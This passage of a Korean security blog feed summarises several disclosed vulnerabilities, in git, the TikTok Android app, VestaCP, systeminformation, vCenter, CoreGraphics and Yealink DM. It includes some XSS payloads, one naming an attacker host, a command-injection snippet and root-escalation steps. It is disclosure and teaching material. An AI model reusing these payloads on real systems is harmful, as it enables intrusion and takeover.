<code>./git/hooks</code>의 심볼릭 링크 <code>a</code>를 생성합니다.</p><ul><li>git hooks - 특정 이벤트에 실행되는 스크립트</li></ul></li><li><p>타깃이 대소문자를 구분하지 않는 파일 시스템이라면 해당 저장소를 clone 할 때 <code>a</code>와 <code>A</code>를 구분하지 못해 <code>./git/hooks/post-checkout</code> 파일이 Git 캐시에 저장된 악성파일인 <code>A/post-checkout</code>로 대체됩니다.</p></li><li><p>git hooks에 의해 <code>post-checkout</code>가 실행되고 <code>post-checkout</code>에 작성된 임의 코드가 실행됩니다.</p></li></ol><p><img src="/2021/03/23/l0ch/2021-03-23/image.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC - <a href="https://github.com/Maskhe/CVE-2021-21300">https://github.com/Maskhe/CVE-2021-21300</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 안드로이드 틱톡 앱에서 발견된 5가지 취약점</title>
    <link href="/2021/03/22/idioth/2021-03-22/"/>
    <url>/2021/03/22/idioth/2021-03-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105">TikTok for Android 1-Click RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TikTok for Android Application</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안드로이드 틱톡 애플리케이션에서 5가지 취약점이 발견되었습니다. 발견된 5가지 취약점 중 XSS, Zip Slip, RCE 취약점에 대한 상세 내용은 다음과 같습니다.</p><p><strong>Universal XSS on TikTok WebView</strong></p><p>틱톡은 받은 메시지에서 deep-link로 호출될 수 있는 특정 WebView를 사용합니다. WebView는 성능을 향상하기 위해 사용할 때마다 서버에서 가져오는 대신 내부 파일에서 가져오는 falcon link라는 것을 사용합니다. 성능을 측정하기 위해 페이지가 로딩되면 다음과 같은 함수를 실행합니다.</p><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.a.evaluateJavascript(<span class="hljs-string">&quot;JSON.stringify(window.performance.getEntriesByName(\&#x27;&quot;</span> + <span class="hljs-keyword">this</span>.webviewURL + <span class="hljs-string">&quot;\&#x27;))&quot;</span>, v2);</code></pre><p>페이로드는 query string segment로 인코딩 되기 때문에 <code>getEntriesByName</code>의 URL 뒤에 <code>#</code>을 추가한 후 페이로드를 삽입하면 정상적으로 스크립트가 동작하게 됩니다.</p><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>stringify(window.performance.get<span class="hljs-constructor">EntriesByName(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">m</span>.<span class="hljs-params">tiktok</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">falcon</span><span class="hljs-operator">/</span>#&#x27;)</span>,alert(<span class="hljs-number">1</span>));<span class="hljs-comment">//&#x27;))</span></code></pre><p><strong>Another XSS on AddWikiActivity</strong></p><p><code>AddWikiActivity</code>는 악성 URL이 열리지 않도록 URL 검사를 합니다. 그러나 <code>http</code>나 <code>https</code> scheme만 확인을 하므로 다른 scheme에 대해서는 검사를 진행하지 않습니다. 예를 들어 <code>javascript</code> scheme를 사용하여 페이로드를 구성하면 XSS가 가능합니다.</p><pre><code class="hljs perl">window.ToutiaoJSBridge.invokeMethod(JSON.stringify(&#123;    <span class="hljs-string">&quot;__callback_id&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,    <span class="hljs-string">&quot;func&quot;</span>: <span class="hljs-string">&quot;openSchema&quot;</span>,    <span class="hljs-string">&quot;__msg_type&quot;</span>: <span class="hljs-string">&quot;callback&quot;</span>,    <span class="hljs-string">&quot;params&quot;</span>: &#123;        <span class="hljs-string">&quot;schema&quot;</span>: <span class="hljs-string">&quot;aweme://wiki?url=javascript://m.tiktok.com/%250adocument.write(%22%3Ch1%3EPoC%3C%2Fh1%3E%22)&amp;disable_app_link=false&quot;</span>    &#125;,    <span class="hljs-string">&quot;JSSDK&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,    <span class="hljs-string">&quot;__iframe_url&quot;</span>: <span class="hljs-string">&quot;http://iframe.attacker.com/&quot;</span>&#125;));</code></pre><p><strong>Remote Code Execution</strong></p><p>RCE를 하기 위해서 zip file을 생성하고, path traversal을 통해 <code>/data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so</code>을 overwrite 해야 합니다. 이를 위해서 Zip Slip 취약점이 사용됩니다.</p><p><code>TmaTestActivity</code>는 인터넷에서 zip 파일을 통해 SDK를 업데이트합니다. 이때 <code>DownloadBaseBundleHandler</code>에서 <code>sdkUpdateVersion</code> 파라미터를 확인하여 버전을 확인하는데, 값을 <code>99.99.99</code>로 설정하면 검사를 통과하여 다운로드를 시작합니다. 다운로드 후 파일 이름에 있는 <code>&#123;md5sum_of_file&#125;</code>과 파일의 md5sum 값을 비교하므로 파일 이름은 <code>anything_&#123;md5sum_of_file&#125;.zip</code>이 되어야 합니다. 그 후 다운로드 한 파일은 정상적으로 압축이 해제되어 native-library를 악성 라이브러리로 overwrite 할 수 있습니다. 라이브러리를 overwirte 한 후 애플리케이션을 재실행하거나 <code>com.tt.miniapphost.placeholder.MiniappTabActivity0</code>를 통해 Remote Code Execution이 가능합니다.</p><p>해당 취약점들은 XSS 코드 수정, <code>TmaTestActivity</code> 삭제, <code>intent</code> scheme 제한 구현으로 수정되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>tiktok</tag>
      
      <tag>zip-slip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] VestaCP Local Privilege Escalation 취약점</title>
    <link href="/2021/03/21/insu/2021-03-21/"/>
    <url>/2021/03/21/insu/2021-03-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/">SSD Advisory – VestaCP LPE Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VestCP 0.9.8-24 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 웹 호스팅 제어판인 VESTA Control Panel(VestaCP)에서 user가 admin으로 권한 상승할 수 있는 취약점이 발견되었습니다.</p><p>해당 취약점은 <code>/add/web/index.php</code>에서 호출되는 v-add-web-domain 쉘 스크립트에서 발생합니다. 해당 스크립트는 디렉터리나 파일의 내용이 존재하는지에 검사 없이 다음 명령어를 사용합니다.</p><pre><code class="hljs basic"><span class="hljs-symbol">88 </span>: # Changing file owner &amp; permission<span class="hljs-symbol">89 </span>: chown -R $user:$user $HOMEDIR/$user/web/$domain<span class="hljs-symbol">90 </span>: chown root:$user /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.* $conf<span class="hljs-symbol">91 </span>: chmod <span class="hljs-number">640</span> /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.*<span class="hljs-symbol">92 </span>: chmod <span class="hljs-number">751</span> $HOMEDIR/$user/web/$domain $HOMEDIR/$user/web/$domain/*<span class="hljs-symbol">93 </span>: chmod <span class="hljs-number">551</span> $HOMEDIR/$user/web/$domain/stats $HOMEDIR/$user/web/$domain/logs<span class="hljs-symbol">94 </span>: chmod <span class="hljs-number">644</span> $HOMEDIR/$user/web/$domain/public_*html/*.*</code></pre><p>위의 명령어들은 <code>$domain</code> 폴더에서 사용되므로 94 줄의 명령을 통해 읽고 싶은 파일의 권한을 변경할 수 있고, 92 줄의 명령을 통해 폴더의 접근 권한을 변경할 수 있습니다. </p><p>또한 VestaCP는 사용자를 추가하거나 리스트 하는 등의 web-app의 모든 기능을 bash 스크립트에 의존합니다. 이러한 bash 스크립트들은 root 소유이며 변경할 수 없지만, <code>sudo -l</code>을 통해 패스워드 입력 없이 admin이 root 권한으로 이러한 스크립트를 실행할 수 있습니다. 이를 통해 root로 권한 상승하는 방법은 다음과 같습니다.</p><ol><li>v-list-user 스크립트에 <code>source $VESTA/func/main.sh</code>가 존재하므로 <code>/tmp/func</code> 폴더에 <code>/bin/bash</code> 쉘 스크립트를 생성합니다.</li><li>패스워드 입력 없이 스크립트를 실행할 수 있으므로 환경 변수 <code>$VESTA</code>를 <code>/tmp</code>로 overwrite 합니다.</li><li>v-list-user를 실행하면, root 권한을 획득할 수 있습니다.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>insu</tag>
      
      <tag>vestacp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] ZDI에서 선정한 2020년 제일 중요한 취약점 Top 5</title>
    <link href="/2021/03/21/j0ker/zdi_2020_vuln/"/>
    <url>/2021/03/21/j0ker/zdi_2020_vuln/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요. 믿거 조 씨 집안 28대손 Joker(조-커)입니다. 첫 글은 부담스럽지 않게 번역글로 준비해봤습니다. 앞으로 재미있는 연구 많이 해서 좋은 글 올려드리도록 하겠습니다 (__ __) 참고로 번역에는 의역이 많을 예정입니다. 이런 걸로 태클 ㄴㄴ</p><p><img src="/2021/03/21/j0ker/zdi_2020_vuln/Untitled.png"></p><p>두두등장</p><hr><p>연말이 되면서, 우리는 2020년에 받은 취약점들을 뒤돌아 보면서 최고의 취약점들을 뽑아보면 어떨까라는 생각을 하게 되었다. 생각은 이렇게 했지만, 작년에(글은 작년에 나온 거라 올해라고 되어 있지만 읽기 편하도록 현재 시점에서 작년이라 하겠다) 우리가 공개한 Advisor들의 수가 거의 최고에 다다랐기 때문에 1400개가 넘는 버그들 중에서 최고의 버그 5개를 골라내는 것은 생각보다 어려운 일이었다. 그리고 마침내 우리는 2020년에 제출된 버그들 중 최고의 버그 Top 5를 꼽아보았다! 짜잔!</p><h1 id="CVE-2020-0688-ZDI-20-258"><a href="#CVE-2020-0688-ZDI-20-258" class="headerlink" title="CVE-2020-0688/ZDI-20-258"></a>CVE-2020-0688/ZDI-20-258</h1><p><strong>Microsoft Exchange Server Exchange Control Panel Fixed Cryptographic Key Remote Code Execution Vulnerability</strong></p><p>이 취약점은 Microsoft Exchange Server의 Exchange Admin Center 웹 인터페이스에서 발견된 매우 크리티컬한 취약점으로, 인증된 Exchange 사용자는 이 취약점을 통해 서버의 SYSTEM 권한을 얻을 수 있다. 이 웹 인터페이스는 “Admin” 인터페이스라고 불리기는 하지만, Exchange 서버의 mailbox에 대한 인증서를 가지고 있는 유저라면 모두 접근이 가능하며 Outlook Web Access와 같이 네트워크에 노출되어 있다. 이 취약점은 Exchange Admin Center ASP.NET에 설치되어 있는 암호화 키(“machine keys”)와 연관이 있다. Exchange에서는 설치할 때마다 이 키들을 랜덤하게 생성하여 해당 키가 유니크하고 안전하도록 해야 한다. 하지만, 실제로는 이 키들을 install media에서 바로 복사해오는데, 이로 인해 해커가 다른 제품의 installation을 참고하여 이 키들을 알 수 있다. 해커는 이 키들을 이용해 서버에 조작된 메시지를 보내고, 해당 메시지가 deserialize 되면서 arbitrary code execution을 할 수 있다. Exchange는 보통 엔터프라이즈의 중심에 있기 때문에 Exchange Server의 취약점은 매우 중요하고 해커들도 매우 탐낸다. 만약 당신의 조직에서 아직 이 취약점을 패치하지 않았다면, 최대한 빨리 패치를 진행하길 바란다. 좀 더 디테일한 내용들은 이 <a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">링크</a>에서 확인할 수 있다.</p><h1 id="CVE-2020-3992-ZDI-20-1377"><a href="#CVE-2020-3992-ZDI-20-1377" class="headerlink" title="CVE-2020-3992/ZDI-20-1377"></a>CVE-2020-3992/ZDI-20-1377</h1><p><strong>VMware ESXi SLP Use-After-Free Remote Code Execution Vulnerability</strong></p><p>이 버그는 ZDI 취약점 연구원 Lucas Leong이 발견한 버그이다. ESXi는 VMWare 사에서 개발한 엔터프라이즈급 하이퍼바이저이다. Service Location Protocol(SLP)는 ESXi에 기본적으로 활성화되어 있는 프로토콜 중 하나이다. SDP는 클라이언트가 네트워크 서비스를 탐색할 수 있도록 지원하는 프로토콜이다. SLP에서 가장 인기 있는 기능이 OpenSLP인데, Lucas는 ESXi에서 자체 제작한 버전을 사용한다는 것을 발견하였다. 거기다가 이 자체 제작 버전에서 크리티컬한 취약점 두 개가 발견되었다.</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1377/">첫 번째 취약점</a>은 Use-After-Free(UAF) 취약점으로 <code>SLPDPorcessMessage()</code>에서 SLPMessage 오브젝트가 free 되었음에도 불구하고 SLPDatabase 구조체에서 계속해서 해당 메모리를 레퍼런스 하고 있어 발생한 취약점이다. 이 취약점은 WAN 환경에 있는 해커에 의해 활용될 수 있다.  </p><p>취약점이 발견된 이후, VMware는 이 취약점을 패치하였지만 제대로 처리하지 못하였고 ZDI-CAN-12190으로 패치에 대한 bypass 취약점이 제보되었다. </p><p>또 한 가지 주목할만한 점은 이 취약점을 이용해서 원격으로 공격할 수 있기도 하지만, 제한된 환경에서 실행되는 프로세스에서의 sandbox escape도 가능하다는 것이다. 이 취약점을 통해, EXSi 같이 많이 연구된 제품들에서도 아직 알지 못했던(잘 살펴보지 않았던) attack surface들이 있다는 것을 알 수 있었다.</p><h1 id="CVE-2020-9850-ZDI-20-672"><a href="#CVE-2020-9850-ZDI-20-672" class="headerlink" title="CVE-2020-9850/ZDI-20-672"></a>CVE-2020-9850/ZDI-20-672</h1><p><strong>Apple Safari in Operator JIT Type Confusion Remote Code Execution Vulnerability</strong></p><p>이 버그는 Georgia Tech Systems Software &amp; Security Lab팀이 <a href="https://taesoo.kim/pubs/2020/jin:pwn2own2020-safari-slides.pdf">Pwn2Own에 참여하면서</a> 제보한 버그이다. 이 버그는 DFG 단에서 발생하는 Webkit type confusion으로 시작되는 버그 체인의 한 부분으로 작년에 발견된 이 <a href="https://www.zerodayinitiative.com/blog/2019/11/25/diving-deep-into-a-pwn2own-winning-webkit-bug">버그</a>와 유사하다. OpenGL’s CVM(Core Virtual Machine)의 힙 오버플로우 버그와 체이닝 하면 사파리에서 “.app” symlink를 실행할 수 있다. 그런 다음 레이스 컨디션을 통해 cfprefsd와 kextload에서 first-time app protection 우회, root 접근, 권한 상승이 차례대로 이뤄지며 모든 것들은 피해자가 웹페이지를 방문하고 난 후 백그라운드에서 이루어진다. </p><p>한 웹 페이지에 접속했는데 10초 후에 악성코드가 당신의 컴퓨터에서 실행된다고 생각해보라. 소름이 돋을 정도이다. 결과적으로 그들은 Pwn2Own에서 성공적으로 데모를 마쳐 $70,000를 획득하였다. </p><h1 id="CVE-2020-7460-ZDI-20-949"><a href="#CVE-2020-7460-ZDI-20-949" class="headerlink" title="CVE-2020-7460/ZDI-20-949"></a>CVE-2020-7460/ZDI-20-949</h1><p><strong>FreeBSD Kernel sendmsg System Call Time-Of-Check Time-Of-Use Privilege Escalation Vulnerability</strong></p><p>이 취약점은 m00nbsd라는 닉네임을 사용하는 한 연구원이 ZDI에 제보하였다. 해커는 FreeBSD의 32-bit <code>sendmsg()</code> 시스템 콜에 존재하는 Time-Of-Check, Time-Of-Use(TOCTOU) 취약점을 이용하여 낮은 권한에서 kernel-level code execution을 할 수 있다. 이 취약점은 시스템 콜에 존재하는 double-fetch 버그로 유저 랜드에 있는 MsgLen 변수에 첫 access가 있고 난 후, 두 번째 access가 발생하기 전에 더 큰 값으로 바꾸면 오버플로우를 트리거할 수 있다. 해커는 루프에서 정상적인 인자로 <code>sendmsg()</code>를 호출하는 스레드를 하나와 MsgLen을 큰 값으로 조작하는 스레드 하나를 실행하여 레이스 컨디션을 발생시켜 오버플로우를 트리거할 수 있다. 이 버그의 난이도는 낮지만 비교적 오랫동안 살아남았다. 우리는 작년 9월에 이 버그에 대해 포스팅을 하였으니 관심이 있다면 <a href="https://www.zerodayinitiative.com/blog/2020/9/1/cve-2020-7460-freebsd-kernel-privilege-escalation">여기</a>에서 자세한 내용을 확인할 수 있다.</p><h1 id="CVE-2020-17057-ZDI-20-1371"><a href="#CVE-2020-17057-ZDI-20-1371" class="headerlink" title="CVE-2020-17057/ZDI-20-1371"></a><a href="https://hackyboiz.github.io/2021/01/01/l0ch/2021-01-01/">CVE-2020-17057</a>/ZDI-20-1371</h1><p><strong>Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</strong></p><p>이 취약점은 Windows의 DirectComposition이라는 커널 모드의 그래픽 구성요소에서 발견된 취약점이다. <code>win32kbase!DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> 함수는 유저 모드에서 전달된 데이터를 기준으로 <code>DirectComposition::CInteractionTrackerMarshaler</code> 타입의 객체를 채운다. 만약 함수를 실행하는 과정에서 비정상적인 데이터를 발견하면, 에러를 핸들링하는 분기로 들어가게 되는데, 여기에서 함수에서 생성한 객체에 있는 리소스들을 release 한다. Release 과정에서 초기화되지 않은 포인터를 release 하게 된다. 이를 통해 해커는 커널 모드에서 실행 흐름을 제어할 수 있고 결과적으로 SYSTEM 권한을 획득할 수 있다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>j0ker</tag>
      
      <tag>zdi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21315: node js library command injection</title>
    <link href="/2021/03/20/fabu1ous/2021-03-20/"/>
    <url>/2021/03/20/fabu1ous/2021-03-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC">CVE-2021-21315-systeminformation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>systeminformation Library for Node.JS (npm package “systeminformation”) &lt; 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>CVE-2021-21315는 npm 패키지인  <code>systeminformation</code>에서 발생하는 command injection 취약점입니다. <code>systeminformation</code> 패키지는 하드웨어, 시스템 및 OS 등의 세부 정보를 검색하는 기능의 오픈 소스 함수 모음입니다. 그중 <code>si.inetLatency()</code>, <code>si.inetChecksite()</code>, <code>si.services()</code>, <code>si.processLoad()</code> 에 사용될 파라미터 값은 sanitizing 해야 하며 array 형태로 들어오는 데이터를 모두 차단해야 합니다.</p><p>String array 데이터는 함수 <code>sanitizeShellString()</code>의 sanitizing 작업을 무시할 수 있어<code>si.inetLatency()</code>, <code>si.inetChecksite()</code>, <code>si.services()</code>, <code>si.processLoad()</code> 함수들의 서비스 파라미터로 사용될 시 command injection이 가능합니다.</p><pre><code class="hljs bash">const si = require(<span class="hljs-string">&#x27;systeminformation&#x27;</span>);const <span class="hljs-built_in">command</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;OS Command&gt;)</span>&quot;</span>;si.inetChecksite([<span class="hljs-built_in">command</span>]);</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>command injection</tag>
      
      <tag>node js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21972: VMware vCenter의 인증되지 않은 시스템 권한의 원격 코드 실행 취약점</title>
    <link href="/2021/03/19/l0ch/2021-03-19/"/>
    <url>/2021/03/19/l0ch/2021-03-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/unauth-rce-vmware/">Unauthorized RCE in VMware vCenter</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>vmware vcenter_server 7.0 U1c 이전</li><li>vmware vcenter_server 6.7 U3l 이전</li><li>vmware vcenter_server 6.5 U3n 이전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMware 중앙 집중식 관리 유틸리티이며 여러 가상 시스템 및 ESXi 호스트와 구성 요소를 관리하는 vCenter에서 unrestricted file upload, path traversal 취약점을 이용한 원격 코드 실행 취약점에 대한 세부 정보가 공개되었습니다.</p><p>취약점이 존재하는 <code>uploadova</code> 엔드포인트의 경로인 <code>/ui/vropspluginui/rest/services/*</code> 는 인증 없이 접근할 수 있습니다.</p><pre><code class="hljs c">@RequestMapping(value = &#123;<span class="hljs-string">&quot;/uploadova&quot;</span>&#125;, method = &#123;RequestMethod.POST&#125;)    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uploadOvaFile</span><span class="hljs-params">(@RequestParam(value = <span class="hljs-string">&quot;uploadFile&quot;</span>,required = <span class="hljs-literal">true</span>) CommonsMultipartFile uploadFile, HttpServletResponse response)</span> throws Exception </span>&#123;...        <span class="hljs-keyword">if</span> (!uploadFile.isEmpty()) &#123;            <span class="hljs-keyword">try</span> &#123;                ...                InputStream inputStream = uploadFile.getInputStream();                File dir = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/tmp/unicorn_ova_dir&quot;</span>);                <span class="hljs-keyword">if</span> (!dir.exists()) &#123;                    dir.mkdirs();                &#125; <span class="hljs-keyword">else</span> &#123;                    String[] entries = dir.<span class="hljs-built_in">list</span>();                    String[] var9 = entries;                    <span class="hljs-keyword">int</span> var10 = entries.length;                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var11 = <span class="hljs-number">0</span>; var11 &lt; var10; ++var11) &#123;                        String entry = var9[var11];                        File currentFile = <span class="hljs-keyword">new</span> File(dir.getPath(), entry);                        currentFile.<span class="hljs-keyword">delete</span>();                    &#125;                    logger.info(<span class="hljs-string">&quot;Successfully cleaned : /tmp/unicorn_ova_dir&quot;</span>);                &#125;                TarArchiveInputStream in = <span class="hljs-keyword">new</span> TarArchiveInputStream(inputStream);                TarArchiveEntry entry = in.getNextTarEntry();                ArrayList result = <span class="hljs-keyword">new</span> ArrayList();...</code></pre><p><code>uploadova</code> 는 아카이브 파일을 받아 <code>/tmp/unicorn_ova_dir</code> 경로에 해당 아카이브 파일을 열어 파일을 생성하는데, 생성되는 아카이브 내부의 파일 이름에 대한 검증이 없어 <code>../</code> 을 포함하여 원하는 위치에 파일 업로드가 가능합니다.</p><p>Windows의 경우 해커가 <code>.jsp</code> 형식의 웹 쉘을 마찬가지로 인증 없이 접근 가능한 엔드포인트 경로인 <code>C:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code> 에 업로드하고 접근하면 시스템 권한으로 vCenter 호스트에서 원격 코드 실행이 가능합니다.</p><p>이후 모든 엔드포인트가 인증 후 접근이 가능하도록 패치되었지만 여전히 파일 업로드 및 path traversal 취약점은 남아있기 때문에 인증된 클라이언트에 의한 공격에는 PoC가 유효한 것으로 알려졌습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>vmware</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
      <tag>unrestricted file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] macOS: Integer overflow in CoreGraphics leading to oob write</title>
    <link href="/2021/03/18/insu/2021-03-18/"/>
    <url>/2021/03/18/insu/2021-03-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2130">macOS: Integer overflow in CoreGraphics leading to out-of-bounds write when rendering fonts</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CoreGraphics, Big Sur version 11.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>macOS CoreGraphics에서 폰트를 렌더링 할 때 out-of-bound write가 가능한 취약점이 발견되었습니다. 해당 취약점은 glyphs를 bitmap으로 렌더링 할 때 CoreGraphics library의 범위 검증 미흡으로 인해 발생합니다. glyph bitmap을 렌더링 하기 위한 delta 기반의 anti-aliasing 알고리즘은 <code>2^30</code>보다 작은 좌표만 올바르게 처리할 수 있습니다. 그러나 이 좌표에 대한 검사가 존재하지 않습니다. 취약점이 존재하는 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v96 &gt;&gt; <span class="hljs-number">12</span> == v94 &gt;&gt; <span class="hljs-number">12</span> )              &#123;                v106 = v101 - v100;(<span class="hljs-number">1</span>)             v107 = (v96 + v94) &gt;&gt; <span class="hljs-number">13</span>;                v108 = v96 - v94;                <span class="hljs-keyword">if</span> ( v96 - v94 &lt; <span class="hljs-number">1</span> )                  v108 = v94 - v96;                <span class="hljs-keyword">if</span> ( v94 - v96 &gt; <span class="hljs-number">0</span> )                  LOWORD(v96) = v94;                v109 = (v106 * (v108 - ((<span class="hljs-number">2</span> * (<span class="hljs-keyword">unsigned</span> __int16)v96) &amp; <span class="hljs-number">0x1FFE</span>) + <span class="hljs-number">0x2000</span>)) &gt;&gt; <span class="hljs-number">13</span>;(<span class="hljs-number">2</span>)             *(_WORD *)(v86 + <span class="hljs-number">2</span> * v107) += v109;(<span class="hljs-number">3</span>)             *(_WORD *)(v86 + <span class="hljs-number">2</span> * v107 + <span class="hljs-number">2</span>) += v106 - v109;                v90 = v160;              &#125;</code></pre><p>(1)에서 두 좌표의 중간 지점을 계산하고 숫자로 변환합니다. 이때 x 좌표는 둘 다 <code>-2^30</code>보다 작으므로 두 값을 더할 경우 integer overflow가 발생하여 값이 큰 양의 정수가 됩니다. 이로 인해 (2)와 (3)에서 oob write가 발생합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob</tag>
      
      <tag>insu</tag>
      
      <tag>mac</tag>
      
      <tag>coregraphics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Yealink DM Pre-Auth root level RCE</title>
    <link href="/2021/03/18/idioth/2021-03-18/"/>
    <url>/2021/03/18/idioth/2021-03-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/">SSD Advisory – Yealink DM Pre Auth ‘root’ level RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Yealink DM 3.6.0.20 버전 이하</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>통합 개발 및 배포, 실시간 모니터링 및 경고, 원격 문제 해결 등의 솔루션을 가진 Yealink Device Management(이하 Yealink DM) platform에서 인증되지 않은 원격 사용자가 임의 명령을 수행할 수 있는 취약점이 발견되었습니다.</p><p>원격 코드 실행은 pre-auth SSRF 취약점과 Command Injection 취약점을 체이닝 하여 트리거 됩니다. SSRF 취약점이 존재하는 <code>/usr/local/yealink/dmweb/api/index.js</code> 코드 일부는 다음과 같습니다.</p><pre><code class="hljs javascript"> <span class="hljs-number">17</span> <span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">app</span> =&gt;</span> &#123; <span class="hljs-number">18</span>     app.use(<span class="hljs-string">&#x27;/premise&#x27;</span>, router); <span class="hljs-number">19</span> &#125;;[...]<span class="hljs-number">217</span> router.get(<span class="hljs-string">&#x27;/front/getPingData&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<span class="hljs-number">218</span>     <span class="hljs-comment">// res.send(&#123;&quot;ret&quot;:1,&quot;data&quot;:&quot;PING www.baidu.com (14.215.177.38): 56 data bytes\n64 bytes from 14.215.177.38: seq=0 ttl=54 time=15.084 ms\n64 bytes from 14.215.177.38: seq=1 ttl=54 time=15.888 ms\n64 bytes from 14.215.177.38: seq=2 ttl=54 time=15.742 ms\n64 bytes from 14.215.177.38: seq=3 ttl=54 time=15.622         ms\n64 bytes from 14.215.177.38: seq=4 ttl=54 time=16.384 ms\n\n--- www.baidu.com ping statistics ---\n5 packets transmitted, 5 packets received, 0% packet loss\nround-trip min/avg/max = 15.084/15.744/16.384 ms\n&quot;,&quot;error&quot;:null&#125;)</span><span class="hljs-number">219</span>     <span class="hljs-comment">// return;</span><span class="hljs-number">220</span>     <span class="hljs-keyword">try</span> &#123;<span class="hljs-number">221</span>         <span class="hljs-keyword">let</span> url = req.query.url;<span class="hljs-number">222</span>         <span class="hljs-comment">// ��telnet�����pos���ping�trace����������端�����pos��以�并�pos传��</span><span class="hljs-number">223</span>         <span class="hljs-keyword">let</span> pos = 